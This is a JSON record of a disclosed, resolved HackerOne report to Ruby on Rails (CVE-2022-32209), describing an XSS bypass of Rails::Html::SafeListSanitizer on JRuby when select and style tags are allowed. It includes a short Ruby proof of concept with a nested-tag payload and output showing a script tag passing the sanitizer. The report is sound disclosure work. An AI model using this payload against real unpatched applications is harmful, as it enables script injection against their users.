{
  "id": 1530898,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTMwODk4",
  "url": "https://hackerone.com/reports/1530898",
  "title": "Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-04-05T07:34:03.628Z",
  "submitted_at": "2022-04-05T07:34:03.681Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "windshock",
    "url": "/windshock",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22,
    "url": "https://hackerone.com/rails",
    "handle": "rails",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby on Rails",
      "twitter_handle": "rails",
      "website": "http://rubyonrails.org/security",
      "about": "Web development that doesn't hurt."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-32209"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-06-14T03:49:29.284Z",
  "bug_reporter_agreed_on_going_public_at": "2022-06-14T03:49:29.200Z",
  "team_member_agreed_on_going_public_at": "2022-06-09T22:30:43.282Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "It seems to be a problem caused by a difference between the nokogiri java implementation and the ruby implementation.\nIt seems to be an ambiguous case as to whether to do it with nokogiri or have rails-html-sanitizer defend it.\n\njruby9.3.3.0 (nokogiri java), use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag\ncode\n```\ntags = %w(select style)\nputs \"------------------------------------------------------------------\"\nputs \"use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag\"\nputs \"input: <select<style/>W<xmp<script>alert(1)</script>\"\nputs \"output: \"+Rails::Html::SafeListSanitizer.new.sanitize(\"<select<style/>W<xmp<script>alert(1)</script>\", tags: tags).to_s\nputs \"------------------------------------------------------------------\"\n```\n\nresult\n```\ninput: <select<style/>W<xmp<script>alert(1)</script>\nscrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :W\nscrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :&lt;script&gt;alert(1)&lt;/script&gt;\nscrub --> node type :Nokogiri::XML::Element, node name :xmp, node to_s :<xmp>&lt;script&gt;alert(1)&lt;/script&gt;</xmp>\nscrub --> node type :Nokogiri::XML::Element, node name :style, node to_s :<style>W<script>alert(1)</script></style>\nscrub --> node type :Nokogiri::XML::Element, node name :select, node to_s :<select><style>W<script>alert(1)</script></style></select>\noutput: <select><style>W<script>alert(1)</script></style></select>\n```\n\n## Impact\n\nIt is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-07-09T22:30:43.410Z",
  "allow_singular_disclosure_after": -50428398.580266014,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "zy9ard3",
    "shubham_srt",
    "cametome006",
    "shivammusic",
    "meispi",
    "tay0b",
    "saeedz",
    "thelilnix"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.5,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 160,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rails/rails",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
